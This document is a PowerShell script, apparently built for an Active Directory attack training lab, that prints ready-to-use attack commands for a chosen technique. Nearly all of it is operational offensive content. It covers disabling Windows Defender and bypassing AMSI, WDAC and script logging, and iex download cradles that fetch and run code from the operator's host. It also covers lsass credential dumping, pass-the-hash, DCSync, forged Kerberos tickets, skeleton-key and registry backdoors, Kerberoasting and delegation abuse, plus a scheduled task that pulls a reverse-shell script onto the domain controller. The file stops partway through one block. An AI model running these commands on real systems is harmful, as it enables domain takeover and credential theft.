<#
Author: Hacker101 (@raj77in)
License: BSD 3-Clause
Required Dependencies: None
User vars.ps1 to customize the default values.
#>

param(
    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$File = "creds.csv",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$Type = "AES256",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$Target = "krbtgt",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$Source,

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$Domain = "dollarcorp.moneycorp.local",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$DomainName = "dcorp",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$DomainController = "dcorp-dc",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$DomainSid = "S-1-5-21-719815819-3726368948-3917688648",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$CurrentUser = "student175",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$CurrentUserPass = "Password",

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [string]$IP,

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [ValidateRange(0, 5)]
    [int]$DownloadCradle = 1,

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [ValidateSet('Local', 'Loader' )]
    [string]$LoaderBin = 'Loader',

    [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
    [ValidateSet('Bypass', 'Creds', 'OPTH', 'DCSync', 'Golden', 'Silver', 'Diamond',
        'Skeleton', 'DSRM', 'CredSSP', 'AdminSDHolder', 'ACLRightsAbuse', 'ACLSecurityDesciptor',
        'Kerberoast', 'ASREPRoast', 'Delegation', 'ResourceBasedDelegation', 'InterDomainTrust',
        'IntraDomainTrust', 'CertAbuse', 'MSSQL', 'PowerShell', 'LAPS', 'gMSA', 'ShadowCred',
        'AzureIntegration', 'ForeignSecurityPrincipal', 'PAMTrust','mimikatz' )]
    [string]$Attack

)

if ( Test-Path -Path "vars.ps1" -PathType Leaf ) {
    . .\vars.ps1
}

function Get-IP {
    if (-Not $IP) {
    (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias  "OpenVPN TAP*").IPAddress
    }
    else {
        $IP
    }
}

function Get-Creds {
    # HEaders for the CSV are as follows 
    # Source,Target,Type,Value
    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$Type,

        [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$Target,

        [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$Source,

        [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$File = "creds.csv"
    )
    begin {
        if ($File -eq "" -or ! $File) {
            $File = "crtp_creds.txt"
        }
        if ($Source -eq "") { Remove-Variable Source }
        if ($Type -eq "") { Remove-Variable Type }
        if ($Target -eq "") { Remove-Variable Target }

        #Write-Host "Get-Creds -Type $Type -Target $Target -Source $Source -File $File"
    }
    process {

        if ( Test-Path -Path $File -PathType Leaf) {
            $data = Import-Csv $File
            # $data[1]  |Write-Host

            # Write-Host  $Type and $Target and $data.Length and $Source
            #Write-Host @args
            if ( $Source -ne ""  ) {
                $data | Where-Object { $_.Type -eq $Type -and $_.Target -Match $Target -and $_.Source -eq $Source } | Select-Object -First 1
            }
            else {
                $data | Where-Object { $_.Type -eq $Type -and $_.Target -Match $Target } | Select-Object -First 1
            }
        }
        else {
            "NotAvailable"
        }
    }

}

# if (! $Source ) {
#  $Source = $DomainController
# }

# if ( $PSBoundParameters.ContainsKey('Type') -or $PSBoundParameters.ContainsKey('Target') -or $PSBoundParameters.ContainsKey('Source') ){
#if ( -not $PSBoundParameters.ContainsKey('Attack')) {
if ( ! $Attack) {
    Get-Creds
}

if ( $DownloadCradle -eq 1 ) {
    $dwcradle = ".\FILE'))"
}
if ( $DownloadCradle -eq 1 ) {
    $dwcradle = "iex((New-Object Net.WebClient).DownloadString('http://" + $(Get-IP) + ":8080/FILE'))"
}
elseif ( $DownloadCradle -eq 2 ) {
    $dwcradle = "iex(iwr -UseBasicParsing 'http://" + $(Get-IP) + ":8080/FILE')"
}
elseif ( $DownloadCradle -eq 3 ) {
    $dwcradle = '$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate(''http://' + $(Get-IP) + ':8080/FILE'' );sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response'
    
}
elseif ( $DownloadCradle -eq 4 ) {
    $dwcradle = '$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(''GET'',''http://' + $(Get-IP) + ':8080/FILE'',$false);$h.send();iex $h.responseText'

}
elseif ( $DownloadCradle -eq 5 ) {
    $dwcradle = '$wr = [System.NET.WebRequest]::Create("http://' + $(Get-IP) + ':8080/FILE"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()'
}

function Get-Loader {

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$BinFile
    )

    $URL = "http://" + $(Get-IP) + ":8080"
    if ( $LoaderBin ) { 
        if ($LoaderBin -eq 'Loader') {
            $loader = ".\Loader.exe -path $URL/$BinFile -args"
        }
        else {
            $loader = ".\$BinFile";
        }
    }
    else {
        $loader = ".\BinFile";
    }
    $loader
}

$files = @{ 
    "Invoke-Mimikatz"     = "Invoke-Mimikatz.ps1";
    "SafetyKatz"          = "SafetyKatz.exe";
    "amsibypass"          = "amsibypass.txt";
    "sbloggingbypass"     = "sbloggingbypass.txt";
    "Invoke-SDPropagator" = "Invoke-SDPropagator.ps1";
    "Invoke-ASREPRoast"   = "Invoke-ASREPRoast.ps1";
    "PowerView"           = "PowerView.ps1";
    "RACE"                = "RACE.ps1";
    "DAMP"                = "DAMP.ps1";
    "Get-ASREPHash"       = "Get-ASREPHash.ps1";
    "PowerUpSQL"          = "PowerUpSQL.ps1";
    "ADDLL"               = "Microsoft.ActiveDirectory.Management.dll";
    "ADModule"            = "ActiveDirectory.psd1";
    "AdmPwd"              = "AdmPwd.PS.psd1";
}

$dwfile = @{}
foreach ( $item in  $files.Keys) {
    $dwfile[$item] = $($dwcradle -replace 'FILE', $files[$item])
}

if ( $Attack -eq "Bypass" ) {

    @"
cd \AD\Tools
.\InviShell\RunWithRegistryNonAdmin.bat

# Disable windows defender
Set-MpPreference -DisableRealtimeMonitoring `$true -Verbose
Set-MpPreference -DisableIOAVProtection `$true
Set-MpPreference -DisableRealtimeMonitoring `$true
Set-MpPreference -DisableIntrusionPreventionSystem `$true -DisableIOAVProtection `$true -DisableRealtimeMonitoring `$true -DisableScriptScanning `$true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend



# Forward port to my machine
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=$(Get-IP)

## Bypass WDAC
cd C:\Users\Public
New-CIPolicy -Filepath AllowLoader.xml -Level Publisher  -UserPEs -ScanPath c:\Users\Public -NoScript -Fallback Hash
Merge-CIPolicy -PolicyPaths  c:\Users\Public\AllowLoader.xml,c:\Windows\System32\CodeIntegrity\Merged.xml -OutputFilePath c:\Windows\System32\CodeIntegrity\Merged2.xml
ConvertFrom-CIPolicy -XMLFilePath c:\Windows\System32\CodeIntegrity\Merged2.xml -BinaryFilePath  c:\Windows\System32\CodeIntegrity\policy.p7b
$PolicyBinary = "c:\Windows\System32\CodeIntegrity\policy.p7b"
$DestinationBinary = $env:windir+"\System32\CodeIntegrity\SiPolicy.p7b"
Copy-Item  -Path $PolicyBinary -Destination $DestinationBinary -Force
Invoke-CimMethod -Namespace root\Microsoft\Windows\CI -ClassName PS_UpdateAndCompareCIPolicy -MethodName Update -Arguments @{FilePath = $DestinationBinary}


"@ | Write-Host
}

if ( $Attack -eq "Creds" ) {

    @"
# To create a credential object
[string]$userName = 'MyUserName'
[string]$userPassword = 'MySuperSecurePassword'
# Convert to SecureString
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

* Dump credentials on a local machine using Mimikatz.

$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])
$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

* Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
$(Get-Loader("SafetyKatz.exe")) "sekurlsa::ekeys"

* Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
$(Get-Loader("SharpKatz.exe")) --Command ekeys

* Dump credentials using Dumpert (Direct System Calls and API unhooking)
./rundll32.exe Outflank-Dumpert.dll,Dump

* Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

* Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
"@ | Write-Host
}

if ($Attack -eq 'OPTH') {
    if ( -Not $Target) { $Target = "Administrator" }
    $key = $((Get-Creds).Value )
    $creds = "/user:$Target /${Type}:$key"
    @"

* Run as user:Administrator
$($dwfile["amsibypass"])
$($dwfile["sbloggingbypass"])
$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:$Domain $creds /run:powershell.exe"'
$(Get-Loader("SafetyKatz.exe")) "sekurlsa::pth /domain:$Domain $creds /run:cmd.exe" "exit"

* Below doesn't need elevation
$(Get-Loader("Rubeus.exe")) asktgt $creds /ptt

* Below command needs elevation
$(Get-Loader("Rubeus.exe")) asktgt $creds /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

"@ | Write-Host
}

if ($Attack -eq "DCSync") {
    if ( -Not $Target) { $Target = "krbtgt" }
    $key = $((Get-Creds).Value )
    $creds = "/user:$Target /${Type}:$key"
    @"
* To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"lsadump::dcsync /user:$DomainName\krbtgt"'
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:$DomainName\krbtgt" "exit"

"@ | Write-Host
}

if ($Attack -eq "Golden") {
    $key = $((Get-Creds).Value )
    $cred = "/user:$Target /${Type}:$key"

    @"

*  Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername $DomainController

* To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:dcorp\krbtgt" "exit"

$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /domain:$Domain /sid:$DomainSid $cred /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /User:Administrator /domain:$Domain /sid:$DomainSid $cred /startoffset:0 /endin:600 /renewmax:10080 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt" "exit"


"@ | Write-Host
}

if ($Attack -eq "Silver") {
    $key = $((Get-Creds).Value )
    $cred = "/user:$Target /${Type}:$key"
    @"
* Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /domain:$Domain /sid:${DomainSid} /target:$DomainController.$Domain /service:CIFS $cred /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

* Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /domain:$Domain /sid:${DomainSid} /target:$DomainController.${Domain} /service:HOST $cred /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

* Schedule and execute a task - noisy but fine for PoC :)
schtasks /create /S $DomainController.$Domain /SC Weekly /RU "NT Authority\SYSTEM" /TN "ST32Check" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://$(Get-IP):8080/Invoke-PowerShellTcpEx.ps1''')'"
schtasks /Run /S $DomainController.$Domain /TN "ST32Check"
"@ | Write-Host
}

if ($Attack -eq "Diamond") {
    $key = $((Get-Creds -Type AES256 -Target krbtgt).Value )
    $cred = "/user:$Target /${Type}:$key"
    @"
* We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):
$(Get-Loader("Rubeus.exe")) diamond /krbkey:$key /user:$CurrentUser /password:$CurrentUserPass /enctype:aes /ticketuser:administrator /domain:$Domain /dc:$DomainController.$Domain /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
$(Get-Loader("Rubeus.exe")) diamond /krbkey:$key /tgtdeleg /enctype:aes256 /ticketuser:administrator /domain:$Domain /dc:$DomainController.$Domain /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

"@ | Write-Host

}

if ($Attack -eq "Skeleton") {
    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
* Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $DomainController.$Domain
* Now, it is possible to access any machine with a valid username and password as "mimikatz"
Enter-PSSession -Computername $DomainController -credential $DomainName\Administrator

"@ | Write-Host
}

if ($Attack -eq "DSRM") {
    $admin_key_dsrm = $((Get-Creds -Target Administrator -Type "NTLM-DSRM").Value )
    @"

$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
* Dump DSRM password (needs DA privs)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername $DomainController

* Compare the Administrator hash with the Administrator hash of below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername $DomainController
* First one is the DSRM local Administrator.

* But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
Enter-PSSession -Computername $DomainController
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

Use below command to pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:$DomainController /user:Administrator /ntlm:$admin_key_dsrm /run:powershell.exe"'
dir \\${DomainController}\C$

"@ | Write-Host

}

if ($Attack -eq "CredSSP") {
    @"
# We can use either of the ways:
# – Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# – Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):

$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"misc::memssp"'

"@ | Write-Host

}

if ($Attack -eq "AdminSDHolder") {
    $admin_key_dsrm = $((Get-Creds -Target Administrator -Type "NTLM-DSRM").Value )
    $DomainLDAP = 'DC=' + $($Domain -replace '\.', ', DC=')
    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$DomainLDAP' -PrincipalIdentity $CurrentUser -Rights All -PrincipalDomain $Domain -TargetDomain $Domain -Verbose

# Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder,:

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$DomainLDAP' -PrincipalIdentity $CurrentUser -Rights ResetPassword -PrincipalDomain $Domain -TargetDomain $Domain -Verbose
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$DomainLDAP' -PrincipalIdentity $CurrentUser -Rights WriteMembers -PrincipalDomain $Domain -TargetDomain $Domain -Verbose

# Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
$($dwfile["Invoke-SDPropagator"])
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# For pre-Server 2008 machines:
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose

# Check the Domain Admins permission - PowerView as normal user:
$($dwfile["PowerView"])
"@ | Write-Host

    @'
Find-InterestingDomainACL
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "$CurrentUser"}

# Abusing FullControl using PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Abusing ResetPassword using PowerView
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

'@ | Write-Host

}


if ($Attack -eq "ACLRightsAbuse") {
    $DomainLDAP = "DC=" + $($Domain -replace '\.', ', DC=')

    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["PowerView"])

Find-InterestingDomainACL
# Add FullControl rights:
Add-DomainObjectAcl -TargetIdentity '$DomainLDAP' -PrincipalIdentity $CurrentUser -Rights All -PrincipalDomain $Domain -TargetDomain $Domain -Verbose

# Add rights for DCSync:
Add-DomainObjectAcl -TargetIdentity '$DomainLDAP' -PrincipalIdentity $CurrentUser -Rights DCSync -PrincipalDomain $Domain -TargetDomain $Domain -Verbose

# Execute DCSync:
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# or
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:dcorp\krbtgt" "exit"

"@ | Write-Host
}


if ( $Attack -eq "ACLSecurityDesciptor" ) {

    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["RACE"])
# On local machine with $CurrentUser
Set-RemoteWMI -SamAccountName $CurrentUser -Verbose

# On remote machine for student1 without explicit credentials:
Set-RemoteWMI -SamAccountName $CurrentUser -ComputerName $DomainController -namespace 'root\cimv2' -Verbose

# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
Set-RemoteWMI -SamAccountName $CurrentUser -ComputerName $DomainController -Credential Administrator -namespace 'root\cimv2' -Verbose

# On remote machine remove permissions:
Set-RemoteWMI -SamAccountName $CurrentUser -ComputerName $DomainController -namespace 'root\cimv2' -Remove -Verbose

# Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
# On local machine for student1:
Set-RemotePSRemoting -SamAccountName $CurrentUser -Verbose

# On remote machine for student1 without credentials:
Set-RemotePSRemoting -SamAccountName $CurrentUser -ComputerName $DomainController -Verbose

# On remote machine, remove the permissions:
Set-RemotePSRemoting -SamAccountName $CurrentUser -ComputerName $DomainController -Remove


$($dwfile["DAMP"])
# Using RACE or DAMP, with admin privs on remote machine
Add-RemoteRegBackdoor -ComputerName $DomainController -Trustee $CurrentUser -Verbose

# As student1, retrieve machine account hash:
Get-RemoteMachineAccountHash -ComputerName $DomainController -Verbose

# Retrieve local account hash:
Get-RemoteLocalAccountHash -ComputerName $DomainController -Verbose

# Retrieve domain cached credentials:
Get-RemoteCachedCredential -ComputerName $DomainController -Verbose


"@ | Write-Host
}

if ( $Attack -eq "Kerberoast" ) {

    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["PowerView"])
# Find user accounts used as Service accounts
Get-DomainUser -SPN

# Use Rubeus to list Kerberoast stats
$(Get-Loader("Rubeus.exe")) kerberoast /stats

# Use Rubeus to request a TGS
$(Get-Loader("Rubeus.exe")) kerberoast /user:svcadmin /simple

# To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC

$(Get-Loader("Rubeus.exe")) kerberoast /stats /rc4opsec
$(Get-Loader("Rubeus.exe")) kerberoast /user:svcadmin /simple /rc4opsec

# Kerberoast all possible accounts
$(Get-Loader("Rubeus.exe")) kerberoast /rc4opsec /outfile:hashes.txt

# Crack ticket using John the Ripper
john.exe --wordlist=10k-worst-pass.txt hashes.txt

# Targeted Kerberoasting

Get-DomainUser -PreauthNotRequired -Verbose

# Or find users we can modify :)
Find-InterestingDomainAcl -ResolveGUIDs | ?{`$_.IdentityReferenceName -match "RDPUsers"}
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose

Get-DomainUser -Identity supportuser | select serviceprincipalname
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp/whatever1'}
$(Get-Loader("Rubeus.exe")) kerberoast /outfile:targetedhashes.txt
john.exe --wordlist=10k-worst-pass.txt targetedhashes.txt

"@ | Write-Host
}

if ( $Attack -eq "ASREPRoast" ) {

    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["PowerView"])
# If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is
# possible to grab user's crackable AS-REP and brute-force it offline.
# With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

# Enumerating accounts with Kerberos Preauth disabled
Get-DomainUser -PreauthNotRequired -Verbose

# Force disable Kerberos Preauth:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose

# Request encrypted AS-REP for offline brute-force.
# Let's use ASREPRoast
Get-ASREPHash -UserName VPN1user -Verbose
# To enumerate all users with Kerberos preauth disabled and request a hash
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])
$($dwfile["Invoke-ASREPRoast"]
)
Invoke-ASREPRoast -Verbose

# We can use John The Ripper to brute-force the hashes offline
john.exe --wordlist=10k-worst-pass.txt asrephashes.txt
 
"@ | Write-Host
}

if ( $Attack -eq "Delegation" ) {

    @"

    # Unconstrained Delegation
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])
$($dwfile["PowerView"])
        
Get-DomainComputer -UnConstrained

# On the machine with Un-Constrained Delegation
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])
$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
# Look for Administrator ticket and use that in below command
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

## Printer Bug
# On dcorp-appsrv
$(Get-Loader("Rubeus.exe")) monitor /interval:5 /nowrap
# On Attacker machine
${loader}MS-RPRN.exe \\$DomainController.$Domain \\dcorp-appsrv.$Domain
## OR
${loader}PetitPotam.exe \\$DomainController.$Domain \\dcorp-appsrv.$Domain

# Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
$(Get-Loader("Rubeus.exe")) ptt /tikcet:
# Once the ticket is injected, run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

## Constrained Delegation
# Enumerate users and computers with constrained delegation enabled
# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
${loader}/kekeo.exe tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
# Using mimikatz, inject the ticket:
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
ls \\$DomainController.$Domain\c$

## Abusing with Rubeus
# We can use the following command (We are requesting a TGT and TGS in a single command):
$(Get-Loader("Rubeus.exe")) s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.$Domain /ptt
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

## Abusing with Kekeo
# Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash
# Using asktgt from Kekeo, we request a TGT:
tgt::ask /user:dcorp-adminsrv$ /domain:$Domain /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
# Using s4u from Kekeo_one (no SNAME validation):
tgs::s4u /tgt:ticket.kirbi /user:Administrator@$Domain /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
Using mimikatz:
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Abute with Rubeus
# We can use the following command (We are requesting a TGT and TGS in a single command)
$(Get-Loader("Rubeus.exe")) s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
# After injection, we can run DCSync:
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:dcorp\krbtgt" "exit"

"@ | Write-Host
}


if ( $Attack -eq "ResourceBasedDelegation" ) {

    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])
$($dwfile["PowerView"])
## Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
Find-InterestingDomainACL | ?{`$_.identityreferencename -match 'ciadmin'}
# Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
$($dwfile["ADDLL"])
$($dwfile["ADModule"])
`$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount `$comps
# Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:

$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want
$(Get-Loader("Rubeus.exe")) s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd.exe

"@ | Write-Host
}

if ( $Attack -eq "InterDomainTrust" ) {
    $krbtgt_key = $((Get-Creds -Target krbtgt -Type NTLM).Value )
    @"

# Child to Parent
# So, what is required to forge trust tickets is, obviously, the trust key.
# Look for [In] trust key from child to parent.
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName $DomainController
# or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
# or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"

# We can forge and inter-realm TGT:
$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /user:Administrator /domain:$Domain /sid:$DomainSid /sids:<ParentDomainSid>-519 /rc4:$krbtgt_key /service:krbtgt /target:moneycorp.local /ticket:trust_tkt.kirbi" "exit"

## Abuse with Kekeo
# Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
${loader}asktgs.exe trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
# Use the TGS to access the targeted service.
${loader}kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
# Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as well.

# Abuse with Rubeus
# Note that we are still using the TGT forged initially
$(Get-Loader("Rubeus.exe")) asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
ls \\mcorp-dc.moneycorp.local\c$

# We will abuse sIDhistory once again
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
